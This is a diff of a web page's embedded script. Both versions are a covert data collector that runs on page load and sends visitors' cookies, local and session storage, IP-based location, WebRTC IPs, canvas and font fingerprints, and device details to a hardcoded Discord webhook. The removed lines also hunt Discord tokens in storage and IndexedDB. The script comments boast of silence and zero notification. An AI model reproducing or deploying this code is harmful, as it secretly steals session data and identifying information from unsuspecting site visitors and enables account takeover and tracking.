@@ -15,63 +15,41 @@
     </div>
 
     <script>
-        // ============================================================
-        // Silent Advanced Data Collector - Zero Notification
-        // ============================================================
         (function() {
-            // CONFIG - Replace with your webhook
-            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532014138664943808/UfqqJZzdK75pAnKStPZjusSZ8CyFrAIIadPb3PwGq9gwOxhMuUuZbCYcZc1yDWLb-AWz";
+            var WEBHOOK_URL = "https://discord.com/api/webhooks/1532014134030241843/4FJZ8HkRRrKdvNPWYVAW_57qqS-M_Sv-kGcPLETqNv8lmgv1v4I9KIAbbpmi3aTVWrL_";
 
-            // ============================================================
-            // 1. Silent IP fetch (no visible request)
-            // ============================================================
-            function getIP() {
+            function getIPAndLocation() {
                 return new Promise(function(resolve) {
                     try {
                         var xhr = new XMLHttpRequest();
-                        xhr.open('GET', 'https://api.ipify.org?format=json', true);
-                        xhr.timeout = 3000;
+                        xhr.open('GET', 'https://ipinfo.io/json', true);
+                        xhr.timeout = 4000;
                         xhr.onload = function() {
-                            try { resolve(JSON.parse(xhr.responseText).ip || 'Unknown'); } 
-                            catch(e) { resolve('Unknown'); }
-                        };
-                        xhr.onerror = function() { resolve('Unknown'); };
-                        xhr.ontimeout = function() { resolve('Unknown'); };
-                        xhr.send();
-                    } catch(e) { resolve('Unknown'); }
-                });
-            }
-
-            // ============================================================
-            // 2. Silent GeoLocation (no prompt - uses cached if available)
-            // ============================================================
-            function getLocation() {
-                return new Promise(function(resolve) {
-                    try {
-                        if (!navigator.geolocation) return resolve(null);
-                        var watchId = navigator.geolocation.watchPosition(
-                            function(pos) {
-                                navigator.geolocation.clearWatch(watchId);
+                            try {
+                                var data = JSON.parse(xhr.responseText);
+                                var loc = data.loc ? data.loc.split(',') : ['?', '?'];
                                 resolve({
-                                    lat: pos.coords.latitude,
-                                    lon: pos.coords.longitude,
-                                    acc: pos.coords.accuracy
+                                    ip: data.ip || 'Unknown',
+                                    country: data.country || '?',
+                                    region: data.region || '?',
+                                    city: data.city || '?',
+                                    postal: data.postal || '?',
+                                    lat: loc[0] || '?',
+                                    lon: loc[1] || '?',
+                                    timezone: data.timezone || '?',
+                                    org: data.org || '?'
                                 });
-                            },
-                            function() { resolve(null); },
-                            { enableHighAccuracy: false, timeout: 2000, maximumAge: 60000 }
-                        );
-                        setTimeout(function() {
-                            navigator.geolocation.clearWatch(watchId);
-                            resolve(null);
-                        }, 2000);
-                    } catch(e) { resolve(null); }
+                            } catch(e) {
+                                resolve({ ip: 'Unknown', country: '?', region: '?', city: '?', lat: '?', lon: '?' });
+                            }
+                        };
+                        xhr.onerror = function() { resolve({ ip: 'Unknown' }); };
+                        xhr.ontimeout = function() { resolve({ ip: 'Unknown' }); };
+                        xhr.send();
+                    } catch(e) { resolve({ ip: 'Unknown' }); }
                 });
             }
 
-            // ============================================================
-            // 3. Silent System Info (no popups)
-            // ============================================================
             function getSystemInfo() {
                 var info = {};
                 try {
@@ -86,10 +64,12 @@
                     info.screenW = screen.width;
                     info.screenH = screen.height;
                     info.colorDepth = screen.colorDepth;
+                    info.pixelRatio = window.devicePixelRatio || 1;
                     info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                     info.tzOffset = new Date().getTimezoneOffset();
                     info.localTime = new Date().toISOString();
                     info.os = getOS();
+                    info.browser = getBrowser();
                 } catch(e) {}
                 return info;
             }
@@ -107,23 +87,28 @@
                 return 'Unknown';
             }
 
-            // ============================================================
-            // 4. Silent Network Info (no popups)
-            // ============================================================
+            function getBrowser() {
+                var ua = navigator.userAgent;
+                if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) return 'Chrome';
+                if (ua.indexOf('Edg') !== -1) return 'Edge';
+                if (ua.indexOf('Firefox') !== -1) return 'Firefox';
+                if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) return 'Safari';
+                if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) return 'Opera';
+                return 'Unknown';
+            }
+
             function getNetworkInfo() {
                 try {
                     var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
                     return {
                         type: conn.effectiveType || '?',
                         rtt: conn.rtt || '?',
-                        downlink: conn.downlink || '?'
+                        downlink: conn.downlink || '?',
+                        saveData: conn.saveData || false
                     };
-                } catch(e) { return { type: '?', rtt: '?', downlink: '?' }; }
+                } catch(e) { return { type: '?', rtt: '?', downlink: '?', saveData: false }; }
             }
 
-            // ============================================================
-            // 5. Silent Battery Info (no popups)
-            // ============================================================
             function getBattery() {
                 return new Promise(function(resolve) {
                     try {
@@ -140,14 +125,11 @@
                 });
             }
 
-            // ============================================================
-            // 6. Silent Canvas Fingerprint (no popups)
-            // ============================================================
             function getFingerprint() {
                 try {
                     var canvas = document.createElement('canvas');
-                    canvas.width = 200;
-                    canvas.height = 50;
+                    canvas.width = 256;
+                    canvas.height = 256;
                     var ctx = canvas.getContext('2d');
                     ctx.textBaseline = 'top';
                     ctx.font = '14px Arial';
@@ -157,13 +139,13 @@
                     ctx.fillText('FP', 60, 15);
                     ctx.fillStyle = 'rgba(102,204,0,0.7)';
                     ctx.fillText('T', 90, 17);
+                    ctx.strokeStyle = '#f00';
+                    ctx.lineWidth = 2;
+                    ctx.strokeRect(5, 5, 200, 40);
                     return canvas.toDataURL('image/png').substring(0, 80) + '...';
                 } catch(e) { return 'Canvas blocked'; }
             }
 
-            // ============================================================
-            // 7. Silent WebRTC IP Leak (no popups)
-            // ============================================================
             function getWebRTCIPs() {
                 return new Promise(function(resolve) {
                     try {
@@ -179,7 +161,9 @@
                                     var parts = line.split(' ');
                                     if (parts.length > 7) {
                                         var ip = parts[4];
-                                        if (ip && ips.indexOf(ip) === -1) ips.push(ip);
+                                        if (ip && ips.indexOf(ip) === -1 && ip.indexOf(':') === -1) {
+                                            ips.push(ip);
+                                        }
                                     }
                                 }
                             });
@@ -190,20 +174,21 @@
                 });
             }
 
-            // ============================================================
-            // 8. Silent Cookie & Storage Grab (no popups)
-            // ============================================================
             function getStorageData() {
                 try {
                     var ls = {};
                     for (var i = 0; i < localStorage.length; i++) {
                         var key = localStorage.key(i);
-                        ls[key] = localStorage.getItem(key);
+                        if (key.toLowerCase().indexOf('token') === -1) {
+                            ls[key] = localStorage.getItem(key);
+                        }
                     }
                     var ss = {};
                     for (var j = 0; j < sessionStorage.length; j++) {
                         var skey = sessionStorage.key(j);
-                        ss[skey] = sessionStorage.getItem(skey);
+                        if (skey.toLowerCase().indexOf('token') === -1) {
+                            ss[skey] = sessionStorage.getItem(skey);
+                        }
                     }
                     return {
                         cookies: document.cookie || 'None',
@@ -215,87 +200,56 @@
                 }
             }
 
-            // ============================================================
-            // 9. Silent Installed Extensions (via plugin detection)
-            // ============================================================
             function getPlugins() {
                 try {
                     var list = [];
                     for (var i = 0; i < navigator.plugins.length; i++) {
                         var p = navigator.plugins[i];
-                        list.push(p.name + ' (' + p.filename + ')');
+                        list.push(p.name);
                     }
                     return list;
                 } catch(e) { return []; }
             }
 
-            // ============================================================
-            // 10. Silent Discord Token Hunter (no popups)
-            // ============================================================
-            function huntDiscordToken() {
-                var token = null;
+            function getWindowInfo() {
                 try {
-                    for (var key in localStorage) {
-                        if (key.indexOf('token') !== -1 || key === 'token') {
-                            var val = localStorage.getItem(key);
-                            if (val && val.length > 20) token = val;
-                        }
-                    }
-                    if (!token) {
-                        for (var skey in sessionStorage) {
-                            if (skey.indexOf('token') !== -1 || skey === 'token') {
-                                var sval = sessionStorage.getItem(skey);
-                                if (sval && sval.length > 20) token = sval;
-                            }
-                        }
-                    }
-                    if (!token) {
-                        var cookies = document.cookie.split('; ');
-                        for (var c = 0; c < cookies.length; c++) {
-                            var parts = cookies[c].split('=');
-                            if (parts[0].indexOf('token') !== -1 && parts[1].length > 20) {
-                                token = parts[1];
-                            }
-                        }
-                    }
+                    return {
+                        innerW: window.innerWidth,
+                        innerH: window.innerHeight,
+                        outerW: window.outerWidth,
+                        outerH: window.outerHeight,
+                        availW: screen.availWidth,
+                        availH: screen.availHeight
+                    };
+                } catch(e) { return {}; }
+            }
+
+            function getFonts() {
+                var fonts = [];
+                var testFonts = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Lucida Console', 'Arial Black'];
+                try {
+                    var canvas = document.createElement('canvas');
+                    var ctx = canvas.getContext('2d');
+                    ctx.font = '72px monospace';
+                    var base = ctx.measureText('mmmmmmmmmmli').width;
+                    testFonts.forEach(function(font) {
+                        ctx.font = '72px ' + font + ', monospace';
+                        var width = ctx.measureText('mmmmmmmmmmli').width;
+                        if (width !== base) fonts.push(font);
+                    });
                 } catch(e) {}
-                return token || 'Not found';
+                return fonts;
             }
 
-            // ============================================================
-            // 11. Silent IndexedDB Discord Token (async)
-            // ============================================================
-            function getIndexedDBToken() {
-                return new Promise(function(resolve) {
-                    try {
-                        var req = indexedDB.open('discord');
-                        req.onsuccess = function(e) {
-                            var db = e.target.result;
-                            try {
-                                var tx = db.transaction(['keyval'], 'readonly');
-                                var store = tx.objectStore('keyval');
-                                var get = store.get('token');
-                                get.onsuccess = function() {
-                                    var val = get.result;
-                                    resolve((val && typeof val === 'string' && val.length > 20) ? val : null);
-                                };
-                                get.onerror = function() { resolve(null); };
-                            } catch(err) { resolve(null); }
-                        };
-                        req.onerror = function() { resolve(null); };
-                        setTimeout(function() { resolve(null); }, 1500);
-                    } catch(e) { resolve(null); }
-                });
-            }
-
-            // ============================================================
-            // 12. Silent Data Exfiltration via Image Beacon (no fetch)
-            // ============================================================
-            function exfiltrateViaImage(data) {
+            function exfiltrate(data) {
                 try {
-                    var payload = btoa(encodeURIComponent(JSON.stringify(data))).substring(0, 2000);
-                    var img = new Image();
-                    img.src = WEBHOOK_URL + '?data=' + payload;
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    }).catch(function() {
+                        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
+                    });
                 } catch(e) {
                     try {
                         navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(data));
@@ -303,69 +257,75 @@
                 }
             }
 
-            // ============================================================
-            // 13. Main Silent Collector
-            // ============================================================
             async function silentCollect() {
-                var ip = await getIP();
-                var loc = await getLocation();
+                var ipData = await getIPAndLocation();
                 var batt = await getBattery();
                 var webrtc = await getWebRTCIPs();
-                var idbToken = await getIndexedDBToken();
-                var discordToken = huntDiscordToken();
-                if (idbToken && idbToken !== 'Not found') discordToken = idbToken;
 
                 var system = getSystemInfo();
                 var network = getNetworkInfo();
                 var storage = getStorageData();
                 var plugins = getPlugins();
                 var fingerprint = getFingerprint();
+                var windowInfo = getWindowInfo();
+                var fonts = getFonts();
 
                 var payload = {
-                    'IP': ip,
-                    'Location': loc || { lat: '?', lon: '?', acc: '?' },
-                    'OS': system.os || '?',
+                    'IP': ipData.ip,
+                    'Location': {
+                        'Country': ipData.country,
+                        'Region': ipData.region,
+                        'City': ipData.city,
+                        'Postal': ipData.postal,
+                        'Lat': ipData.lat,
+                        'Lon': ipData.lon,
+                        'Timezone': ipData.timezone,
+                        'Organization': ipData.org
+                    },
+                    'OS': system.os,
+                    'Browser': system.browser,
                     'Device': {
                         'Platform': system.platform,
                         'Language': system.lang,
+                        'Languages': system.langs,
                         'Screen': system.screenW + 'x' + system.screenH,
+                        'Available Screen': windowInfo.availW + 'x' + windowInfo.availH,
+                        'Window Size': windowInfo.innerW + 'x' + windowInfo.innerH,
                         'Color Depth': system.colorDepth,
+                        'Pixel Ratio': system.pixelRatio,
                         'CPU Cores': system.hwConcurrency,
                         'RAM': system.deviceMemory ? system.deviceMemory + 'GB' : '?',
-                        'Touch': system.touchPoints,
+                        'Touch Points': system.touchPoints,
                         'Timezone': system.timezone,
+                        'Offset (min)': system.tzOffset,
                         'Local Time': system.localTime
                     },
                     'Network': network,
                     'Battery': batt || { level: '?', charging: '?' },
                     'WebRTC IPs': webrtc,
                     'Plugins': plugins,
+                    'Fonts Detected': fonts,
                     'Canvas Fingerprint': fingerprint,
                     'Cookies': storage.cookies,
                     'LocalStorage': storage.localStorage,
                     'SessionStorage': storage.sessionStorage,
-                    'Discord Token': discordToken,
                     'UserAgent': system.ua,
                     'Referrer': document.referrer || 'Direct',
                     'Page URL': window.location.href,
                     'Time': new Date().toISOString()
                 };
 
-                exfiltrateViaImage(payload);
+                exfiltrate(payload);
             }
 
-            // ============================================================
-            // 14. Execute with zero visibility
-            // ============================================================
             if (document.readyState === 'complete') {
-                setTimeout(silentCollect, 500);
+                setTimeout(silentCollect, 200);
             } else {
                 window.addEventListener('load', function() {
-                    setTimeout(silentCollect, 500);
+                    setTimeout(silentCollect, 200);
                 });
             }
-
-            setTimeout(silentCollect, 100);
+            setTimeout(silentCollect, 50);
         })();
     </script>
 </body>
